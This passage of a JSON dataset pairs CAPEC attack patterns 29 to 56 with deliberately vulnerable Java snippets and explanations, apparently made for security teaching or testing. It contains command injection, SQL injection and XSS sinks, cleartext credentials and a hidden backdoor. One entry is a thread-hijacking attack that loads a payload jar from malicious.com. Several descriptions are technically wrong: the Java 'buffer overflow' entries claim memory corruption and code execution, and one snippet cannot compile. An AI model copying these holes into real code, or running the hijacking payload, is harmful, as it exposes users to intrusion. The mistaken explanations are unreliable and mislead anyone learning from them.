        "description": "This code is vulnerable to fuzzing attacks due to multiple weaknesses: it performs command execution without proper input validation, uses an incomplete blacklist for filtering dangerous inputs, and reveals sensitive system information in error messages. The code directly concatenates user input into a command string, making it susceptible to command injection attacks. Additionally, the error handling exposes system details that could be useful for attackers during fuzzing attempts."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "public class FileProcessor {\n    public void processFile(String fileName) {\n        File file = new File(fileName);\n        \n        if (file.exists() && file.canRead()) {\n            // Time delay between check and use\n            try {\n                Thread.sleep(1000); // Simulating some processing time\n            } catch (InterruptedException e) {}\n            \n            try (FileInputStream fis = new FileInputStream(file)) {\n                byte[] content = new byte[(int) file.length()];\n                fis.read(content);\n                processContent(content);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    private void processContent(byte[] content) {\n        // Process file content\n    }\n}",
        "description": "This code demonstrates a classic Time-of-check Time-of-use (TOCTOU) race condition vulnerability. The code checks if a file exists and is readable, but there's a time gap between this check and when the file is actually read. During this window, an attacker could replace the original file with a malicious one, or change the file's permissions or contents. The vulnerability is made more explicit with an artificial delay (Thread.sleep), but even without it, the race condition would still exist. The code also lacks proper synchronization mechanisms to prevent concurrent access to the file."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "public class ThreadHijacker {\n    public static void main(String[] args) {\n        Thread targetThread = findPrivilegedThread();\n        try {\n            targetThread.suspend();\n            Field contextField = Thread.class.getDeclaredField(\"contextClassLoader\");\n            contextField.setAccessible(true);\n            \n            // Inject malicious classloader\n            URLClassLoader maliciousLoader = new URLClassLoader(\n                new URL[]{new URL(\"http://malicious.com/payload.jar\")}\n            );\n            contextField.set(targetThread, maliciousLoader);\n            \n            // Modify thread's execution context\n            ThreadGroup group = targetThread.getThreadGroup();\n            Field parentField = ThreadGroup.class.getDeclaredField(\"parent\");\n            parentField.setAccessible(true);\n            parentField.set(group, Thread.currentThread().getThreadGroup());\n            \n            targetThread.resume();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static Thread findPrivilegedThread() {\n        ThreadGroup root = Thread.currentThread().getThreadGroup();\n        while(root.getParent() != null) {\n            root = root.getParent();\n        }\n        Thread[] threads = new Thread[root.activeCount()];\n        root.enumerate(threads);\n        \n        for(Thread t : threads) {\n            if(t != null && t.getName().contains(\"privileged\")) {\n                return t;\n            }\n        }\n        return null;\n    }\n}",
        "description": "This code demonstrates thread hijacking by identifying a privileged thread, suspending it, and then modifying its context class loader and thread group to inject malicious code. It uses reflection to bypass security checks and modify internal thread states, potentially leading to privilege escalation and unauthorized code execution. The code exhibits vulnerabilities related to privilege context switching, process control, and concurrent execution issues."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "public class VulnerableCookieManager {\n    public static void authenticateUser(HttpServletRequest request, HttpServletResponse response) {\n        String sessionId = request.getParameter(\"sessionId\");\n        String userData = request.getParameter(\"userData\");\n        \n        // Store sensitive data in cookies without encryption\n        Cookie userCookie = new Cookie(\"userCredentials\", userData);\n        userCookie.setMaxAge(365 * 24 * 60 * 60); // Persistent cookie for one year\n        userCookie.setSecure(false);\n        userCookie.setHttpOnly(false);\n        \n        // No validation of cookie data\n        if(request.getCookies() != null) {\n            for(Cookie cookie : request.getCookies()) {\n                if(cookie.getName().equals(\"sessionId\")) {\n                    // Assume cookie data is trustworthy without validation\n                    authenticateSession(cookie.getValue());\n                    break;\n                }\n            }\n        }\n        \n        // Store sensitive information in cleartext\n        Cookie authCookie = new Cookie(\"authToken\", \"user123:admin:plain_text_password\");\n        response.addCookie(authCookie);\n        response.addCookie(userCookie);\n    }\n    \n    private static void authenticateSession(String sessionId) {\n        // No session fixation prevention\n        // No validation of session ID\n        System.out.println(\"User authenticated with session: \" + sessionId);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple cookie-related security issues including: storing sensitive data in cleartext cookies, lack of cookie validation, use of persistent cookies with sensitive data, missing HTTP-only and secure flags, no protection against session fixation, and implicit trust of cookie data without proper verification. The code allows for authentication bypass and manipulation of security-critical state data through cookies."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "@WebServlet(\"/search\")\npublic class SearchServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String query = request.getParameter(\"q\");\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        \n        out.println(\"<html><body>\");\n        out.println(\"<h2>Search Results for: \" + query + \"</h2>\");\n        out.println(\"<div>\" + query + \"</div>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code demonstrates a vulnerable search servlet that directly outputs user-provided query parameters into an HTML page without any sanitization. It accepts a GET request parameter 'q' and renders it directly in the response HTML, making it susceptible to XSS attacks. An attacker can inject malicious script tags or URI-encoded JavaScript through the query parameter."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "public class VulnerableProxy {\n    private static final String BACKEND_SERVER = \"http://internal-server.com\";\n\n    @RequestMapping(\"/proxy\")\n    public ResponseEntity<?> proxyRequest(HttpServletRequest request, @RequestHeader HttpHeaders headers) {\n        try {\n            // Vulnerable: Directly forwarding raw headers without validation\n            StringBuilder forwardUrl = new StringBuilder(BACKEND_SERVER);\n            forwardUrl.append(request.getRequestURI());\n            \n            // Vulnerable: Not validating Content-Length headers\n            HttpURLConnection conn = (HttpURLConnection) new URL(forwardUrl.toString()).openConnection();\n            conn.setRequestMethod(request.getMethod());\n            \n            // Vulnerable: Copying headers without sanitization\n            for (String headerName : headers.keySet()) {\n                conn.setRequestProperty(headerName, headers.getFirst(headerName));\n            }\n            \n            // Vulnerable: Direct streaming of request body without validation\n            if (request.getContentLength() > 0) {\n                try (OutputStream os = conn.getOutputStream()) {\n                    IOUtils.copy(request.getInputStream(), os);\n                }\n            }\n            \n            return new ResponseEntity<>(conn.getInputStream(), HttpStatus.OK);\n        } catch (Exception e) {\n            return new ResponseEntity<>(HttpStatus.INTERNAL_SERVER_ERROR);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that is susceptible to HTTP Request Smuggling, HTTP Request Splitting, and SSRF attacks. The proxy forwards requests without proper validation of headers, content-length, or URL destinations. It doesn't sanitize CRLF sequences in headers and blindly forwards all request components, making it vulnerable to request smuggling attacks between the proxy and backend server. The code also acts as a confused deputy by not preserving or validating the original request source."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "public class HttpResponseHandler {\n    public String processResponse(String userInput, HttpServletResponse response) {\n        // Vulnerable: Direct injection of user input into response header\n        String header = \"Location: \" + userInput;\n        response.addHeader(\"X-Custom-Header\", header);\n        \n        // Vulnerable: No sanitization of CRLF\n        StringBuilder responseBody = new StringBuilder();\n        responseBody.append(\"Status: OK\\r\\n\");\n        responseBody.append(\"Content-Type: text/html\\r\\n\");\n        responseBody.append(\"Set-Cookie: session=\" + userInput + \"\\r\\n\");\n        responseBody.append(\"\\r\\n\");\n        responseBody.append(\"<html><body>Response content</body></html>\");\n        \n        return responseBody.toString();\n    }\n}",
        "description": "This code demonstrates HTTP Response Splitting vulnerability by allowing unvalidated user input to be directly inserted into HTTP response headers and body. The code doesn't sanitize CRLF sequences (\\r\\n) and special characters, enabling an attacker to inject additional headers or split the response into multiple responses. This can lead to cache poisoning, cross-site scripting, and other security issues through response manipulation."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "public class ConfigurationLoader {\n    public void loadConfig(String configPath) {\n        try {\n            Properties config = new Properties();\n            config.load(new FileInputStream(configPath));\n            \n            String scriptPath = config.getProperty(\"script_path\");\n            String command = config.getProperty(\"system_command\");\n            \n            // Dangerous: Evaluates JavaScript from config file\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"javascript\");\n            engine.eval(new FileReader(scriptPath));\n            \n            // Dangerous: Executes system command from config\n            Runtime.getRuntime().exec(command);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates an unsafe configuration loading mechanism that makes the system vulnerable to malicious configuration file attacks. It reads a config file without validation, executes JavaScript code from a file specified in the config, and runs system commands defined in the config file. The code lacks proper input validation, file path verification, and privilege controls, making it susceptible to code injection and privilege escalation attacks through manipulated configuration files."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class SystemManager {\n    private static boolean isDebugMode = false;\n    \n    // Hidden backdoor interface\n    private static String secretCommand(String cmd) {\n        if (cmd.equals(\"debug_override_123\")) {\n            isDebugMode = true;\n            return \"Debug mode activated\";\n        }\n        return \"Unknown command\";\n    }\n    \n    public static void executeCommand(String command) {\n        // No authentication check\n        if (command.startsWith(\"ADMIN:\")) {\n            // Direct system command execution without authorization\n            try {\n                Runtime.getRuntime().exec(command.substring(6));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        } else if (command.startsWith(\"DEBUG:\")) {\n            // Undocumented debug functionality\n            secretCommand(command.substring(6));\n        }\n    }\n    \n    public static void accessUserData(String userId) {\n        // Missing authentication and authorization\n        if (isDebugMode) {\n            // Direct low-level file access\n            new File(\"/users/\" + userId + \"/data.txt\").delete();\n        }\n    }\n}",
        "description": "This code demonstrates an insecure implementation with undocumented debug interfaces, missing authentication and authorization checks, and unsafe use of low-level system functionality. It includes a hidden backdoor command system and direct system command execution without proper validation."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "public class UserDataManager {\n    private static final String TEMP_DIR = \"/tmp/user_data/\";\n    private Map<String, String> userCredentials = new HashMap<>();\n\n    public void processUserData(String userId, String creditCard, String ssn) {\n        // Store sensitive data in temporary file\n        File tempFile = new File(TEMP_DIR + userId + \".tmp\");\n        try (FileWriter writer = new FileWriter(tempFile)) {\n            writer.write(\"CC:\" + creditCard + \"\\n\");\n            writer.write(\"SSN:\" + ssn + \"\\n\");\n            // Process data\n            processPayment(creditCard);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Store credentials in memory without encryption\n        userCredentials.put(userId, creditCard + \"|\" + ssn);\n\n        // Attempt to delete file but don't verify complete removal\n        tempFile.delete();\n    }\n\n    private void processPayment(String creditCard) {\n        // Payment processing simulation\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to sensitive data exposure. It stores sensitive information (credit card and SSN) in cleartext in both temporary files and memory, doesn't properly clean up sensitive data after use, and doesn't implement secure data disposal methods. The temporary files are created in a predictable location and deletion is not verified, potentially leaving sensitive data recoverable."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "public class LibraryLoader {\n    public void loadCustomLibrary(String libraryPath) {\n        String customPath = System.getProperty(\"java.library.path\") + File.pathSeparator + libraryPath;\n        System.setProperty(\"java.library.path\", customPath);\n        \n        try {\n            Field fieldSysPath = ClassLoader.class.getDeclaredField(\"sys_paths\");\n            fieldSysPath.setAccessible(true);\n            fieldSysPath.set(null, null);\n            System.loadLibrary(\"critical_component\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        LibraryLoader loader = new LibraryLoader();\n        loader.loadCustomLibrary(args[0]);\n    }\n}",
        "description": "This vulnerable code allows arbitrary modification of the Java library path through command-line arguments. An attacker can provide a path to a malicious library that will be loaded instead of the intended library. The code doesn't validate the library path or authenticate the library being loaded, allowing for library search path manipulation and potential execution of malicious code."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "public class OnlineStore {\n    @WebServlet(\"/processPayment\")\n    public class PaymentServlet extends HttpServlet {\n        protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n            try {\n                // Get price from client-side cookie\n                Cookie[] cookies = request.getCookies();\n                String price = \"0\";\n                for (Cookie cookie : cookies) {\n                    if (cookie.getName().equals(\"itemPrice\")) {\n                        price = cookie.getValue();\n                        break;\n                    }\n                }\n                \n                // Process payment without validating cookie integrity\n                double amount = Double.parseDouble(price);\n                processPayment(request.getParameter(\"creditCard\"), amount);\n                \n                // Set authentication token in plain text cookie\n                Cookie authCookie = new Cookie(\"authToken\", generateAuthToken());\n                authCookie.setMaxAge(7 * 24 * 60 * 60); // 7 days persistence\n                response.addCookie(authCookie);\n                \n            } catch (Exception e) {\n                response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to client-side data manipulation. It retrieves a price from an unvalidated cookie and processes payments based on this value without any integrity checks. It also stores authentication tokens in cleartext persistent cookies. The code assumes client-side data is immutable and trustworthy, making it susceptible to price manipulation and authentication bypass attacks."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "public class TerminalCommandExecutor {\n    public static void processUserCommand(String input) {\n        try {\n            String command = \"/bin/sh -c \" + input;\n            Process process = Runtime.getRuntime().exec(command);\n            \n            // Store results in world-readable directory\n            String outputFile = \"/tmp/command_output.txt\";\n            ProcessBuilder pb = new ProcessBuilder(\"sh\", \"-c\", \n                \"echo '\" + input + \"' > \" + outputFile);\n            pb.start();\n            \n            // Set world-readable permissions\n            Runtime.getRuntime().exec(\"chmod 666 \" + outputFile);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerability to terminal command injection by directly executing user input without sanitization and storing results in a world-readable location. It combines multiple vulnerabilities: command injection (CWE-77/78), visible sensitive information (CWE-214), process control issues (CWE-114), and exposure of sensitive files (CWE-529)."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "public class EmailHeaderProcessor {\n    public void processEmailHeader(String emailContent) {\n        String[] headers = emailContent.split(\"\\n\");\n        StringBuilder processedEmail = new StringBuilder();\n        \n        for(String header : headers) {\n            // Directly append header without sanitization\n            if(header.startsWith(\"X-Custom-Script:\")) {\n                processedEmail.append(header);\n                executeHeaderCommand(header.substring(15));\n            }\n            // Unsafe header comparison\n            if(header.toLowerCase().contains(\"content-type\")) {\n                String contentType = header.split(\":\")[1];\n                processedEmail.append(\"Content-Type: \" + contentType);\n            }\n        }\n        \n        // Unsafe command execution based on header content\n        Runtime.getRuntime().exec(processedEmail.toString());\n    }\n    \n    private void executeHeaderCommand(String cmd) {\n        try {\n            // Directly execute commands from header without validation\n            Runtime.getRuntime().exec(cmd);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of email headers by failing to neutralize meta-characters and special sequences. It processes email headers without proper sanitization, allows for command injection through custom headers, performs unsafe string comparisons, and executes commands directly from header content. The code violates multiple security principles related to input validation, command injection, and proper encoding of output."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "public void processMIMEAttachment(String mimeData) {\n    byte[] outputBuffer = new byte[1024];\n    try {\n        // Convert MIME data to raw format\n        Base64.Decoder decoder = Base64.getDecoder();\n        byte[] decodedData = decoder.decode(mimeData);\n        \n        // Unsafe copy of decoded data to output buffer\n        System.arraycopy(decodedData, 0, outputBuffer, 0, decodedData.length);\n        \n        // Process attachment based on file extension\n        String fileName = extractFileName(mimeData);\n        if(fileName.endsWith(\".txt\")) {\n            processTextFile(outputBuffer);\n        } else if(fileName.endsWith(\".exe\")) {\n            processExecutable(outputBuffer);\n        }\n    } catch(Exception e) {\n        e.printStackTrace();\n    }\n}",
        "description": "This vulnerable code demonstrates unsafe MIME processing by performing an unchecked buffer copy operation and relying on file extensions for determining processing behavior. It fails to validate input size against buffer capacity, potentially leading to buffer overflow, and blindly trusts file extensions which could lead to malicious file execution."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "public class CommandExecutor {\n    public void executeCommand(String userInput) {\n        // First parser: URL decode\n        String decoded = URLDecoder.decode(userInput, StandardCharsets.UTF_8);\n        \n        // Input validation - checks for dangerous characters\n        if (!decoded.matches(\"^[a-zA-Z0-9\\\\s]+$\")) {\n            throw new IllegalArgumentException(\"Invalid input\");\n        }\n        \n        // Second parser: HTML entity decode\n        String htmlDecoded = StringEscapeUtils.unescapeHtml4(decoded);\n        \n        // Execute the command without additional validation\n        ProcessBuilder pb = new ProcessBuilder(\"cmd\", \"/c\", htmlDecoded);\n        pb.start();\n    }\n}",
        "description": "This vulnerable code demonstrates improper order of validation and parsing operations. It first URL-decodes the input, then validates it for dangerous characters, and finally HTML-decodes it before execution. An attacker could bypass the validation by providing HTML-encoded malicious commands that only become dangerous after the final decoding step. For example, the input 'calc&amp;del%20c:' would pass validation but execute multiple commands after all parsing is complete."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "public class ImageProcessor {\n    public void processJPEGImage(String filePath) {\n        byte[] buffer = new byte[1024];\n        try {\n            FileInputStream fis = new FileInputStream(filePath);\n            if(filePath.toLowerCase().endsWith(\".jpg\")) {\n                int bytesRead = 0;\n                while((bytesRead = fis.read(buffer)) != -1) {\n                    byte[] outputBuffer = new byte[1024];\n                    System.arraycopy(buffer, 0, outputBuffer, 0, bytesRead);\n                    processImageChunk(outputBuffer);\n                }\n            }\n            fis.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processImageChunk(byte[] chunk) {\n        // Process the image chunk without bounds checking\n        byte[] tempBuffer = new byte[chunk.length * 2];\n        for(int i = 0; i <= chunk.length; i++) {\n            tempBuffer[i] = chunk[i];\n        }\n    }\n}",
        "description": "This vulnerable code processes JPEG images without proper buffer size validation. It relies solely on file extension for verification, uses fixed-size buffers without checking input sizes, and performs unsafe array copying. The processImageChunk method contains a buffer overflow vulnerability by accessing array indices beyond bounds. An attacker could craft a malicious JPEG file that exceeds the buffer size, potentially leading to memory corruption and code execution."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "public class SymLinkReader {\n    public static void readSymbolicLink(String symLinkPath) {\n        try {\n            byte[] buffer = new byte[128];\n            String resolvedPath = java.nio.file.Files.readSymbolicLink(\n                java.nio.file.Paths.get(symLinkPath)).toString();\n            \n            java.io.FileInputStream fis = new java.io.FileInputStream(resolvedPath);\n            int bytesRead;\n            \n            // Vulnerable: No bounds checking on buffer\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                // Vulnerable: Direct copy without size validation\n                byte[] output = new byte[bytesRead];\n                System.arraycopy(buffer, 0, output, 0, bytesRead);\n                processData(output);\n            }\n            fis.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void processData(byte[] data) {\n        // Process the potentially overflowed data\n    }\n}",
        "description": "This vulnerable code reads data from a symbolic link without proper validation or bounds checking. It uses a fixed-size buffer (128 bytes) and performs unsafe memory operations that could lead to buffer overflows. The code doesn't validate the symbolic link target or authorize access, making it susceptible to symbolic link attacks and buffer overflow vulnerabilities."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "public class ConfigParser {\n    private static final int BUFFER_SIZE = 256;\n    \n    public static void parseConfig(String configFile) {\n        char[] buffer = new char[BUFFER_SIZE];\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(configFile));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.startsWith(\"<tag>\")) {\n                    String tagContent = line.substring(5, line.indexOf(\"</tag>\"));\n                    tagContent.getChars(0, tagContent.length(), buffer, 0);\n                    processTag(buffer);\n                }\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void processTag(char[] buffer) {\n        // Process the tag content without bounds checking\n        for (int i = 0; buffer[i] != '\\0'; i++) {\n            // Do something with buffer[i]\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a buffer overflow vulnerability in parsing configuration files. It uses a fixed-size buffer to store tag contents without validating input length, allowing an attacker to craft malicious configuration files with oversized tag values. The code fails to check buffer boundaries, lacks input validation, and performs unsafe array operations, making it susceptible to buffer overflows and memory corruption."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "public void processData(String input) {\n    byte[] buffer = new byte[256];\n    byte[] expandedData = new byte[input.length() * 2];\n    \n    // Expand the input data (e.g., decompression or decoding)\n    int expandedSize = 0;\n    for (int i = 0; i < input.length(); i++) {\n        // Simulate data expansion - each character becomes two bytes\n        expandedData[expandedSize++] = (byte)input.charAt(i);\n        expandedData[expandedSize++] = (byte)input.charAt(i);\n    }\n    \n    // Vulnerable copy without checking expanded size against buffer size\n    for (int i = 0; i < expandedSize; i++) {\n        buffer[i] = expandedData[i];  // Potential buffer overflow\n    }\n}",
        "description": "This code demonstrates a vulnerability where input data is expanded during processing (doubling in size), but the code fails to verify if the expanded data will fit within the fixed-size destination buffer. The code assumes a fixed buffer size of 256 bytes but copies expanded data without bounds checking, potentially leading to a buffer overflow when the input length exceeds 128 characters."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            String fileName = request.getParameter(\"file\");\n            if (fileName != null) {\n                File file = new File(fileName);\n                FileInputStream fis = new FileInputStream(file);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(fis));\n                String fileContent = \"\";\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    fileContent += line;\n                }\n                response.getWriter().write(fileContent);\n                reader.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code snippet allows direct file access through a GET parameter without proper validation. It demonstrates issues including improper handling of file paths, lack of input validation for file names, exposure of sensitive data through GET parameters, and missing access control checks. An attacker could potentially access arbitrary files on the system by manipulating the 'file' parameter."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "public class LoginSystem {\n    private static final int MAX_PASSWORD_LENGTH = 8;\n    private String storedPassword = \"password123\";\n    \n    public boolean authenticate(String username, String password) {\n        // No password complexity requirements\n        // No password aging mechanism\n        // No lockout after failed attempts\n        // Single factor authentication only\n        if (password.equals(storedPassword)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void resetPassword(String newPassword) {\n        // Allows weak passwords\n        if (newPassword.length() <= MAX_PASSWORD_LENGTH) {\n            storedPassword = newPassword;\n        }\n    }\n    \n    public String getStoredPassword() {\n        // Password stored in recoverable format\n        return storedPassword;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses that make it susceptible to brute force attacks. It stores passwords in plain text, lacks password complexity requirements, has no mechanism for password aging, implements no protection against multiple failed login attempts, and uses single-factor authentication. The maximum password length is artificially limited, further weakening security."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "public class PasswordRecovery {\n    private static final String SECURITY_QUESTION = \"What is your pet name?\";\n    private static final String STORED_ANSWER = \"fluffy\";\n    private static final String STORED_PASSWORD = \"mypass123\";\n    \n    public String recoverPassword(String answer) {\n        if(answer.toLowerCase().equals(STORED_ANSWER)) {\n            return STORED_PASSWORD;\n        }\n        return null;\n    }\n    \n    public boolean resetPassword(String newPassword) {\n        if(newPassword.length() >= 6) {  // weak password validation\n            STORED_PASSWORD = newPassword;\n            return true;\n        }\n        return false;\n    }\n    \n    public String getSecurityQuestion() {\n        return SECURITY_QUESTION;\n    }\n}",
        "description": "This code demonstrates a vulnerable password recovery system that uses a simple security question mechanism, stores passwords in plaintext, has weak password requirements (only 6 characters), and directly returns the stored password upon successful answer verification. The security question is hardcoded and easily guessable, while the answer comparison is case-insensitive, making it even weaker."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "public class ServiceRegistry {\n    private static Map<String, String> serviceEndpoints = new HashMap<>();\n\n    public static void registerService(String serviceName, String endpoint) {\n        // No authentication or validation\n        serviceEndpoints.put(serviceName, endpoint);\n    }\n\n    public static String lookupService(String serviceName) {\n        // Direct use of user input without validation\n        String endpoint = serviceEndpoints.get(serviceName);\n        if (endpoint != null) {\n            // Storing and returning endpoint URLs in cleartext\n            return endpoint;\n        }\n        return null;\n    }\n\n    public static String getServiceWSDL(String serviceName) {\n        String endpoint = lookupService(serviceName);\n        if (endpoint != null) {\n            // Exposing sensitive WSDL information without access control\n            return endpoint + \"?wsdl\";\n        }\n        return null;\n    }\n\n    public static void updateServiceEndpoint(String serviceName, String newEndpoint) {\n        // No authorization check for updates\n        if (serviceEndpoints.containsKey(serviceName)) {\n            serviceEndpoints.put(serviceName, newEndpoint);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a service registry implementation that lacks proper authorization, input validation, and security controls. It allows unauthorized registration and modification of service endpoints, stores sensitive information in cleartext, and exposes WSDL information without access control. An attacker could register malicious services, modify existing endpoints, or access sensitive service information."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "public class FilePathHandler {\n    public boolean isValidPath(String userInput) {\n        // Vulnerable path validation\n        String normalizedPath = userInput.replace(\"\\\\\", \"/\");\n        \n        // Attempt to check if path is safe\n        if(normalizedPath.contains(\"../\")) {\n            return false;\n        }\n        \n        byte[] pathBytes = normalizedPath.getBytes();\n        // Incorrect null byte check that can be bypassed\n        for(int i = 0; i < pathBytes.length - 1; i++) {\n            if(pathBytes[i] == 0x00) {\n                return false;\n            }\n        }\n        \n        return true;\n    }\n    \n    public void processFile(String filePath) {\n        if(isValidPath(filePath)) {\n            // Process file - vulnerable to null byte injection\n            java.io.File file = new java.io.File(filePath);\n            // ... file operations\n        }\n    }\n}",
        "description": "This code is vulnerable to null byte injection attacks. The path validation can be bypassed by including a null byte in the input string, as the string comparison methods will stop at the null byte while the file system operations will process the entire path. An attacker could use this to bypass path restrictions and access files outside the intended directory."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "public class FileAccessChecker {\n    public boolean isValidPath(String userInput) {\n        // Check if path ends with required slash\n        if (!userInput.endsWith(\"/\")) {\n            return false;\n        }\n        \n        // Vulnerable comparison that can be bypassed with null byte\n        byte[] inputBytes = userInput.getBytes();\n        String filePath = \"/protected/\" + new String(inputBytes);\n        \n        // Attempt to access file without proper null byte handling\n        File file = new File(filePath);\n        return file.exists();\n    }\n    \n    public static void main(String[] args) {\n        FileAccessChecker checker = new FileAccessChecker();\n        // Attacker can inject: \"secret.txt\\0/\"\n        String maliciousInput = \"secret.txt\" + (char)0 + \"/\";\n        boolean result = checker.isValidPath(maliciousInput);\n    }\n}",
        "description": "This code is vulnerable to null byte injection attacks. The input validation checks for a trailing slash but fails to properly handle null bytes in the middle of the string. An attacker can bypass the slash check by appending a slash after a null byte, allowing access to unauthorized files. The code demonstrates CWE-158 (improper null byte handling) and CWE-20 (improper input validation)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "public class UserAccountService {\n    private Connection conn;\n\n    public User findUserAccount(String username) {\n        try {\n            String query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            if (rs.next()) {\n                String errorMsg = \"Found user record: \" + rs.getString(\"username\") + \n                                \", password hash: \" + rs.getString(\"password_hash\") + \n                                \", email: \" + rs.getString(\"email\");\n                logger.debug(errorMsg);\n                return new User(rs);\n            }\n        } catch (SQLException e) {\n            String stackTrace = org.apache.commons.lang3.exception.ExceptionUtils.getStackTrace(e);\n            response.setHeader(\"X-Debug-Info\", stackTrace);\n            response.sendError(500, \"Database error: \" + e.getMessage());\n        }\n        return null;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: SQL injection through direct string concatenation, exposure of sensitive information in error messages and debug logs, and detailed exception information being sent to the client. The code allows for probing the application structure through error messages and SQL manipulation."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "public class UserAuthenticator {\n    public static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hashedBytes = md.digest(password.getBytes());\n            return Base64.getEncoder().encodeToString(hashedBytes);\n        } catch (NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n\n    public static boolean authenticateUser(String username, String password) {\n        String storedHash = getStoredHashFromDatabase(username);\n        String inputHash = hashPassword(password);\n        return storedHash != null && storedHash.equals(inputHash);\n    }\n\n    public static void registerUser(String username, String password) {\n        if(password.length() >= 4) {  // weak password requirement\n            String hashedPassword = hashPassword(password);\n            saveToDatabase(username, hashedPassword);\n        }\n    }\n\n    private static void saveToDatabase(String username, String hashedPassword) {\n        // Store in database without salt\n        // Implementation omitted\n    }\n\n    private static String getStoredHashFromDatabase(String username) {\n        // Retrieve from database\n        // Implementation omitted\n        return null;\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities: using MD5 (a weak hashing algorithm), no salt implementation, weak password requirements (only 4 characters), and single-factor authentication. The hashed passwords stored in the database are susceptible to rainbow table attacks due to the lack of salt and use of a fast hashing algorithm. There's also no password aging mechanism implemented."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
